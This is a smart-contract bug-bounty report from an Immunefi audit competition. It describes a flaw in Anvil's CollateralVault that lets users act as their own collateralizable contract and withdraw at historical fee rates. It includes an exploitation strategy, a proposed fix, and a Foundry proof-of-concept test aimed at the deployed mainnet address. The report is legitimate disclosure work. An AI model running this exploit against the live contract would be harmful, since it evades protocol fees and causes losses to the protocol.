# #36540 \[SC-Insight] users can withdraw funds at incorrect fee rate

## #36540 \[SC-Insight] Users Can Withdraw Funds at Incorrect Fee Rate

**Submitted on Nov 5th 2024 at 15:07:44 UTC by @Blockian for** [**Audit Comp | Anvil**](https://immunefi.com/audit-competition/audit-comp-anvil)

* **Report ID:** #36540
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://etherscan.io/address/0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  * Protocol insolvency
  * Not paying proper fees -> Motive for an attacker + damage to the protocol

### Description

## Anvil Bug Report

### Users Can Withdraw Funds at Incorrect Fee Rate

#### Description

A vulnerability exists in the \`CollateralVault.sol\` contract, allowing users to withdraw funds at any historical fee rate, even after the protocol has increased fees.

#### Root Cause

When users withdraw funds, they are required to pay the current \`withdrawalFeeBasisPoints\` percent as a fee to the protocol. However, to preserve fee conditions for pre-existing reservations, the protocol applies the fee rate in effect at the time each reservation was created.

Typically, only the Collateralizable Contract should be authorized to interact with reservations. This restriction is generally enforced through a \`is \_collateralizableAddress in collateralizableContracts\` check. However, an exception in the \`\_requireCollateralizableAndDecreaseApprovedAmount\` function creates an unintended loophole:

\`\`\`javascript function \_requireCollateralizableAndDecreaseApprovedAmount( address \_collateralizableAddress, address \_accountAddress, address \_tokenAddress, uint256 \_amount ) internal { if (\_collateralizableAddress == \_accountAddress) { return; }

```
if (!collateralizableContracts[_collateralizableAddress]) {
    revert ContractNotApprovedByProtocol(_collateralizableAddress);
}

// ...
```

} \`\`\`

When \`\_collateralizableAddress == \_accountAddress\`, no check confirms that \`\_collateralizableAddress\` is an approved Collateralizable Contract. This oversight allows a user to exploit \`\_requireCollateralizableAndDecreaseApprovedAmount\`, treating their own address as a Collateralizable Contract and manipulating the reservation process.

Consequently, users can initiate, modify, and claim collateral from reservations, using historical fees based on historical rates instead of the current protocol rate.

#### Exploitation Strategy

1. **Initial Setup**: Alice deposits \`x\` funds as collateral by calling \`depositToAccount\`.
2. **Reservation Creation**: Alice creates a reservation with \`amount = 1\` using \`reserveClaimableCollateral\`.

From here, Alice can choose a strategy based on fee changes.

**If Fees Increase**

3. Alice modifies her reservation to hold her entire balance via \`modifyCollateralReservation\`.
4. Alice withdraws her funds at the lower, historical fee rate by calling \`claimCollateral\`.

**If Fees Decrease**

3. Alice cancels the reservation with \`releaseAllCollateral\`.
4. Alice has two options:
   * **Option 1**: Create a new reservation with \`amount = 1\` to "lock in" the lower fee rate in case fees rise in the future.
   * **Option 2**: Withdraw her funds directly at the current rate.

#### Impact

This vulnerability allows users to exploit historical fee rates, undermining the protocol's fee structure and potentially resulting in revenue loss for the protocol.

#### Proposed Solution

To resolve this issue, users cannot act as their own Collateralizable Contracts. Modifying the \`\_requireCollateralizableAndDecreaseApprovedAmount\` function to perform the \`collateralizableContracts\` check first would close this loophole:

\`\`\`javascript function \_requireCollateralizableAndDecreaseApprovedAmount( address \_collateralizableAddress, address \_accountAddress, address \_tokenAddress, uint256 \_amount ) internal { if (!collateralizableContracts\[\_collateralizableAddress]) { revert ContractNotApprovedByProtocol(\_collateralizableAddress); // Enforce contract verification first. }

```
if (_collateralizableAddress &#x3D;&#x3D; _accountAddress) {
    return;
}

// ...
```

} \`\`\`

### Proof of Concept

## POC

Run this foundry test on a fork of the mainnet

This is the command I used to run the test \`forge test --fork-url <https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY\\_KEY> --fork-block-number 21121956 --gas-price 0 --via-ir -vvvv\`

***NOTE:*** Make sure to add the \`setWithdrawalFeeBasisPoints\` and \`depositToAccount\` function signatures to the \`ICollateral\` interface before running.

\`\`\`js // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;

import "forge-std/console.sol"; import {Test} from "forge-std/Test.sol"; import {ICollateral} from "../src/ICollateral.sol"; import {WETH} from "../src/WETH.sol";

contract MainTest is Test { ICollateral public collateral; WETH public weth;

```
address constant COLLATERAL &#x3D; 0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f; // deployed instance of CollateralVault
address constant OWNER &#x3D; 0x4eeB7c5BB75Fc0DBEa4826BF568FD577f62cad21; // used to set fee
address constant ATTACKER &#x3D; 0x894D55bE079E7e19fe526Ac22B0786b7afE18E7e; // some random user who holds WETH
address constant WETH_ADDR &#x3D; 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH address

function setUp() public {
    collateral &#x3D; ICollateral(COLLATERAL);
    weth &#x3D; WETH(WETH_ADDR);
}

function test_attack() public {
    uint256 weth_balance_before &#x3D; weth.balanceOf(ATTACKER);

    vm.startPrank(ATTACKER);
    address[] memory _tokenAddresses &#x3D; new address[](1);
    uint256[] memory _amounts &#x3D; new uint256[](1);
    _tokenAddresses[0] &#x3D; WETH_ADDR;
    _amounts[0] &#x3D; 100 ether;

    weth.approve(COLLATERAL, _amounts[0]);

    collateral.depositToAccount(ATTACKER, _tokenAddresses, _amounts);

    (uint96 _reservationId, uint256 _totalAmountReserved) &#x3D; collateral.reserveClaimableCollateral(ATTACKER, WETH_ADDR, 1);
    vm.stopPrank();


    // set the fee
    vm.startPrank(OWNER);
    collateral.setWithdrawalFeeBasisPoints(500); // change fee to 5%
    vm.stopPrank();

    vm.startPrank(ATTACKER);
    (uint256 _reservedCollateral, uint256 _claimableCollateral) &#x3D; collateral.modifyCollateralReservation(_reservationId, int256(_amounts[0] - uint256(_totalAmountReserved)));
    // claimable amount 99502487562189054726

    collateral.claimCollateral(_reservationId, _claimableCollateral, ATTACKER, false);
    vm.stopPrank();

    uint256 weth_balance_after &#x3D; weth.balanceOf(ATTACKER);

    console.log(&quot;amount lost to fee with attack strategy: %s&quot;, weth_balance_before - weth_balance_after);
}

function test_normal_withdraw() public {
    uint256 weth_balance_before &#x3D; weth.balanceOf(ATTACKER);

    vm.startPrank(ATTACKER);
    address[] memory _tokenAddresses &#x3D; new address[](1);
    uint256[] memory _amounts &#x3D; new uint256[](1);
    _tokenAddresses[0] &#x3D; WETH_ADDR;
    _amounts[0] &#x3D; 100 ether;

    weth.approve(COLLATERAL, _amounts[0]);

    collateral.depositToAccount(ATTACKER, _tokenAddresses, _amounts);
    vm.stopPrank();


    // set the fee
    vm.startPrank(OWNER);
    collateral.setWithdrawalFeeBasisPoints(500); // change fee to 5%
    vm.stopPrank();

    vm.startPrank(ATTACKER);
    collateral.withdraw(WETH_ADDR, 100 ether, ATTACKER);
    vm.stopPrank();

    uint256 weth_balance_after &#x3D; weth.balanceOf(ATTACKER);

    console.log(&quot;amount lost to fee in normal withdraw: %s&quot;, weth_balance_before - weth_balance_after);
}
```

} \`\`\`
